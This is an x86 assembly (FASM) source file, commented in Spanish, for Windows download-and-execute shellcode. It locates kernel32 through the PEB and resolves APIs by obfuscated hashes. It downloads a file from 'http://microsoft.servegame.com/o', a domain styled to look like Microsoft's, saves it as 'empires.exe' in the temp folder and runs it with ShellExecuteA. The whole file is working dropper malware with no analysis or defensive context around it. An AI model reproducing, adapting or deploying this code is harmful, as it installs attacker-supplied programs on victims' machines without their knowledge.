include 'C:\fasmw16726\INCLUDE\win32a.inc'
include 'pe_structs.inc'
include 'nesting_macro.inc'
use32
;--------------------------------------------------------
	jmp fnCodeStart
;--------------------------------------------------------
proc fnGetProcAddress,pDLLBaseAddress,dwHash
	push ebx edi esi

	mov edi,[pDLLBaseAddress]
	virtual at edi
		 .IMAGE_DOS_HEADER IMAGE_DOS_HEADER
	end virtual
	mov ebx,[.IMAGE_DOS_HEADER.e_lfanew]
	add ebx,edi
	virtual at ebx
		 .IMAGE_NT_HEADERS IMAGE_NT_HEADERS
	end virtual

	mov ebx,[.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress]
	add ebx,edi
	virtual at ebx
		 .IMAGE_EXPORT_DIRECTORY IMAGE_EXPORT_DIRECTORY
	end virtual

	xor ecx,ecx
.GetFunctionAddressLoop:
	cmp ecx,[.IMAGE_EXPORT_DIRECTORY.NumberOfNames]
	ja .ErrorNotFound

		mov esi,[.IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
		add esi,edi
		movzx esi,word[esi+ecx*2]

		mov edx,[.IMAGE_EXPORT_DIRECTORY.AddressOfNames]
		add edx,edi
		mov edx,[edx+ecx*4]
		add edx,edi

		inc ecx
;--------------------------------------------------------
;       Hashear una cadena :
;--------------------------------------------------------
		push ebx edi esi

		mov esi,edx
		xor eax,eax ; h
		inc eax
		xor ebx,ebx ; g
.fnHashLoop:
		movzx edi,byte[esi]
		or edi,edi
		jz .fnHashSuccess

			shl eax,1
			add eax,edi

			mov edx,eax
			and edx,0x0FFFFFFF
			not edx;0xF0000000
			cmp ebx,edx
			jnz @F

				mov edx,ebx
				shr edx,24
				xor eax,edx
			@@:
			mov edx,ebx
			not edx
			and eax,edx

			inc esi
			jmp .fnHashLoop

.fnHashSuccess:
		pop esi edi ebx
;--------------------------------------------------------
		cmp [dwHash],eax
		jnz .GetFunctionAddressLoop

			mov eax,[.IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
			add eax,edi
			mov eax,[eax+esi*4]
			add eax,edi
			jmp .EndOfFunction

.ErrorNotFound:
	xor eax,eax
.EndOfFunction:
	pop esi edi ebx
	leave
	retn
endp
;--------------------------------------------------------
;       Inicio de la shellcode :
;--------------------------------------------------------
fnCodeStart:
	push 0x30
	pop ebx

	mov ebx,[fs:ebx]
	mov ebx,[ebx+0x0C]
	mov ebx,[ebx+0x0C]
	mov ebx,[ebx]
	mov ebx,[ebx]
	mov ebx,[ebx+0x18]
;--------------------------------------------------------
;       Inicializar datos usados por el programa
;--------------------------------------------------------
	jmp .fnGetStringTableAddr
@@:
	pop esi
	jmp .StringTableBase
	;-------------------------------------------
	.szUrlMon	    db 'urlmon.dll',0xFF
	.szShell32	    db 'shell32.dll',0xFF
	.szUri		    db 'http://microsoft.servegame.com/o',0xFF
	.szOutputFile	    db 'empires.exe',0xFF
	;-------------------------------------------
	.hashGlobalAlloc    dd 0xFFFD33DE;0x0002cc21
	.hashGetTempPathA   dd 0xFFFA8156;0x00057ea9
	.hashlstrcatA	    dd 0xFFFF90DA;0x00006f25
	.hashLoadLibraryA   dd 0xFFFA545C;0x0005aba3
	.hashExitProcess    dd 0xFFFD21CA;0x0002de35
	;-------------------------------------------
	.lpOutputDirectory  dd 0xFFFFFFFF
;--------------------------------------------------------
.fnGetStringTableAddr:
	call @B
.StringTableBase:
	lea edx,[esi-(.StringTableBase-.szUrlMon)]
	push 0x04
	pop ecx
.fnAddNullToStringLoop:
	jecxz .fnLoadFunctionsAddr
	cmp byte[edx],0xFF
	jnz @F

	    inc byte[edx]
	    dec ecx

@@:
	inc edx
	jmp .fnAddNullToStringLoop

.fnLoadFunctionsAddr:
	mov edi,edx
	xor ecx,ecx
.fnLoadFunctionsLoop:
		mov eax,[edi+ecx*4]
		not eax
		push ecx
		stdcall fnGetProcAddress,ebx,eax
		add esp,0x08
		pop ecx
		mov [edi+ecx*4],eax
		inc ecx
		cmp ecx,5
		jnz .fnLoadFunctionsLoop
;--------------------------------------------------------
;       Obtener ruta de %TMP%
;--------------------------------------------------------
	mov eax,0xFFFFFDFF
	not eax
	stdcall [esi-(.StringTableBase-.hashGlobalAlloc)],GPTR,eax
	mov [esi-(.StringTableBase-.lpOutputDirectory)],eax
	mov ebx,eax
	mov eax,0xFFFFFDFF
	not eax
	stdcall [esi-(.StringTableBase-.hashGetTempPathA)],eax,ebx
	stdcall [esi-(.StringTableBase-.hashlstrcatA)],ebx,addr esi-(.StringTableBase-.szOutputFile)
;--------------------------------------------------------
;       Descargar el archivo y ejecutarlo
;--------------------------------------------------------
	mov ebx,[esi-(.StringTableBase-.hashLoadLibraryA)]

	stdcall ebx,addr esi-(.StringTableBase-.szUrlMon) ; LoadLibraryA,'urlmon.dll'

	mov ecx,0xFEACF1BC
	not ecx;0x01530e43
	stdcall fnGetProcAddress,eax,ecx ; 'URLDownloadToFileA'
	add esp,0x08

	xor ecx,ecx
	stdcall eax,ecx,addr esi-(.StringTableBase-.szUri),[esi-(.StringTableBase-.lpOutputDirectory)],ecx,ecx

	stdcall ebx,addr esi-(.StringTableBase-.szShell32) ; LoadLibraryA,'shell32.dll'
	mov ecx,0xFFF43E2C
	not ecx;0x000bc1d3
	stdcall fnGetProcAddress,eax,ecx ; 'ShellExecuteA'
	add esp,0x08

	xor ecx,ecx
	xor edx,edx
	inc edx
	stdcall eax,ecx,ecx,[esi-(.StringTableBase-.lpOutputDirectory)],ecx,ecx,addr edx+9

	xor ecx,ecx
	stdcall [esi-(.StringTableBase-.hashExitProcess)],ecx
;--------------------------------------------------------